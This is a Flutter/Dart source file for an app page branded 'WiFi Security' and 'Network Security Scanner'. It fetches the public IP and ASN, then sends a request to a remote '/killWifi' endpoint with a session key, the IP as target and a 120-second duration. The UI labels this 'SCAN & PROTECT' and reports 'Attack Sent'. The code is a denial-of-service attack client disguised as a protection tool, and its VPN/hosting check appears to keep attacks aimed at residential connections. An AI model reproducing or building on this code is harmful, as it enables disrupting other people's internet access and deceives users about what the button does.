import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  // --- BLUE THEME ---
  static const Color bgDark = Color(0xFF0B0B0E);
  static const Color cardColor = Color(0xFF1A1A1E);
  static const Color accentBlue = Color(0xFF2196F3);
  static const Color darkBlue = Color(0xFF0D47A1);
  static const Color softBlue = Color(0xFF64B5F6);
  static const Color primaryWhite = Color(0xFFFFFFFF);
  static const Color softGrey = Color(0xFFA0A0A0);
  static const Color borderSubtle = Color.fromARGB(13, 255, 255, 255);

  LinearGradient get blueGradient => const LinearGradient(
    colors: [accentBlue, darkBlue],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    if (!mounted) return;
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip']?.toString() ?? "-";

      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnValue = info['as']?.toString() ?? "-";
      final asnRaw = asnValue.toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      if (!mounted) return;
      setState(() {
        publicIp = ip;
        region = info['regionName']?.toString() ?? "-";
        asn = asnValue;
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    if (publicIp == "-" || publicIp == "Error") {
      _showAlert("Failed", "Public IP is not available yet.");
      return;
    }

    setState(() => isAttacking = true);
    final url = Uri.parse(
        "http://fajzz-hosting.kalzzptero.my.id:25582/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (!mounted) return;
      if (res.statusCode == 200) {
        _showAlert("Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("Failed", "Server rejected request.");
      }
    } catch (e) {
      if (!mounted) return;
      _showAlert("Error", "Network error: $e");
    } finally {
      if (mounted) {
        setState(() => isAttacking = false);
      }
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardColor,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: accentBlue.withOpacity(0.2)),
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: accentBlue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(
                title == "Attack Sent" ? Icons.check_circle : Icons.warning_amber,
                color: title == "Attack Sent" ? Colors.greenAccent : accentBlue,
                size: 20,
              ),
            ),
            const SizedBox(width: 12),
            Text(
              title,
              style: TextStyle(
                color: primaryWhite,
                fontWeight: FontWeight.w600,
                fontSize: 18,
              ),
            ),
          ],
        ),
        content: Text(
          message,
          style: TextStyle(color: softGrey, fontSize: 13),
        ),
        actions: [
          Center(
            child: Container(
              width: 100,
              decoration: BoxDecoration(
                gradient: blueGradient,
                borderRadius: BorderRadius.circular(12),
              ),
              child: TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text(
                  "OK",
                  style: TextStyle(
                    color: primaryWhite,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoCard(String title, String value, IconData icon) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: cardColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: borderSubtle),
        boxShadow: [
          BoxShadow(
            color: accentBlue.withOpacity(0.05),
            blurRadius: 10,
            offset: const Offset(0, 2),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [accentBlue.withOpacity(0.15), darkBlue.withOpacity(0.15)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Icon(icon, color: accentBlue, size: 22),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  title,
                  style: TextStyle(
                    color: softGrey,
                    fontSize: 11,
                    fontWeight: FontWeight.w500,
                    letterSpacing: 0.3,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  value,
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 14,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ],
            ),
          ),
          if (title == "IP Address")
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(
                color: accentBlue.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: accentBlue.withOpacity(0.2)),
              ),
              child: Text(
                "PUBLIC",
                style: TextStyle(
                  color: accentBlue,
                  fontSize: 8,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 0.5,
                ),
              ),
            ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        title: const Text(
          "WiFi Security",
          style: TextStyle(
            fontWeight: FontWeight.w600,
            fontSize: 18,
            letterSpacing: 0.5,
            color: primaryWhite,
          ),
        ),
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_new, color: accentBlue, size: 20),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.topLeft,
            radius: 1.5,
            colors: [
              accentBlue.withOpacity(0.15),
              bgDark,
              bgDark,
            ],
            stops: const [0.0, 0.5, 1.0],
          ),
        ),
        child: Padding(
          padding: const EdgeInsets.all(20),
          child: isLoading
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Container(
                        width: 50,
                        height: 50,
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: cardColor,
                          borderRadius: BorderRadius.circular(15),
                          border: Border.all(color: accentBlue.withOpacity(0.2)),
                        ),
                        child: CircularProgressIndicator(
                          color: accentBlue,
                          strokeWidth: 2,
                        ),
                      ),
                      const SizedBox(height: 16),
                      Text(
                        "Fetching network info...",
                        style: TextStyle(
                          color: softGrey,
                          fontSize: 12,
                        ),
                      ),
                    ],
                  ),
                )
              : Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    // Header Section
                    Container(
                      padding: const EdgeInsets.all(20),
                      decoration: BoxDecoration(
                        color: cardColor,
                        borderRadius: BorderRadius.circular(24),
                        border: Border.all(color: borderSubtle),
                      ),
                      child: Row(
                        children: [
                          Container(
                            padding: const EdgeInsets.all(12),
                            decoration: BoxDecoration(
                              gradient: blueGradient,
                              borderRadius: BorderRadius.circular(16),
                              boxShadow: [
                                BoxShadow(
                                  color: accentBlue.withOpacity(0.3),
                                  blurRadius: 10,
                                ),
                              ],
                            ),
                            // ✅ FIXED: Icons.wifi_protected_lock diganti dengan Icons.wifi_lock
                            child: Icon(Icons.wifi_lock, color: primaryWhite, size: 28),
                          ),
                          const SizedBox(width: 16),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                const Text(
                                  "Network Security Scanner",
                                  style: TextStyle(
                                    fontSize: 16,
                                    color: primaryWhite,
                                    fontWeight: FontWeight.w600,
                                  ),
                                ),
                                const SizedBox(height: 4),
                                Text(
                                  "Analyzing your public network status",
                                  style: TextStyle(
                                    fontSize: 11,
                                    color: softGrey,
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                    
                    const SizedBox(height: 24),

                    // Section Title
                    Row(
                      children: [
                        Container(
                          width: 3,
                          height: 20,
                          decoration: BoxDecoration(
                            gradient: blueGradient,
                            borderRadius: BorderRadius.circular(2),
                          ),
                        ),
                        const SizedBox(width: 12),
                        const Text(
                          "NETWORK INFORMATION",
                          style: TextStyle(
                            fontSize: 12,
                            color: softGrey,
                            fontWeight: FontWeight.w600,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ],
                    ),
                    
                    const SizedBox(height: 16),

                    // Info Cards
                    _infoCard("IP Address", publicIp, Icons.language),
                    _infoCard("Region", region, Icons.map),
                    _infoCard("ASN", asn, Icons.storage),

                    const SizedBox(height: 24),

                    // Warning if VPN detected
                    if (isVpn)
                      Container(
                        padding: const EdgeInsets.all(16),
                        decoration: BoxDecoration(
                          color: Colors.red.withOpacity(0.05),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: Colors.red.withOpacity(0.2)),
                        ),
                        child: Row(
                          children: [
                            Container(
                              padding: const EdgeInsets.all(8),
                              decoration: BoxDecoration(
                                color: Colors.red.withOpacity(0.1),
                                borderRadius: BorderRadius.circular(12),
                              ),
                              child: Icon(Icons.warning_amber_rounded, color: Colors.redAccent, size: 20),
                            ),
                            const SizedBox(width: 12),
                            Expanded(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const Text(
                                    "VPN / Proxy Detected",
                                    style: TextStyle(
                                      color: Colors.redAccent,
                                      fontSize: 13,
                                      fontWeight: FontWeight.w600,
                                    ),
                                  ),
                                  const SizedBox(height: 2),
                                  Text(
                                    "Target is behind VPN/Hosting. Attack cancelled for security.",
                                    style: TextStyle(
                                      color: softGrey,
                                      fontSize: 11,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),

                    const SizedBox(height: 24),

                    // Attack Button
                    if (!isVpn)
                      Container(
                        height: 56,
                        width: double.infinity,
                        decoration: BoxDecoration(
                          gradient: blueGradient,
                          borderRadius: BorderRadius.circular(16),
                          boxShadow: [
                            BoxShadow(
                              color: accentBlue.withOpacity(0.3),
                              blurRadius: 15,
                              offset: const Offset(0, 4),
                            ),
                          ],
                        ),
                        child: ElevatedButton(
                          onPressed: isAttacking ? null : _attackTarget,
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.transparent,
                            shadowColor: Colors.transparent,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(16),
                            ),
                          ),
                          child: isAttacking
                              ? SizedBox(
                                  width: 22,
                                  height: 22,
                                  child: CircularProgressIndicator(
                                    color: primaryWhite,
                                    strokeWidth: 2,
                                  ),
                                )
                              : Row(
                                  mainAxisAlignment: MainAxisAlignment.center,
                                  children: [
                                    Icon(Icons.security_rounded, color: primaryWhite, size: 20),
                                    const SizedBox(width: 10),
                                    const Text(
                                      "SCAN & PROTECT",
                                      style: TextStyle(
                                        fontSize: 14,
                                        fontWeight: FontWeight.w700,
                                        letterSpacing: 1,
                                        color: primaryWhite,
                                      ),
                                    ),
                                  ],
                                ),
                        ),
                      ),

                    const SizedBox(height: 16),

                    // Security Note
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: accentBlue.withOpacity(0.05),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: accentBlue.withOpacity(0.1)),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.shield_outlined, color: accentBlue, size: 14),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              "Your IP address is protected. This tool is for network security testing only.",
                              style: TextStyle(
                                color: softGrey,
                                fontSize: 10,
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
        ),
      ),
    );
  }
}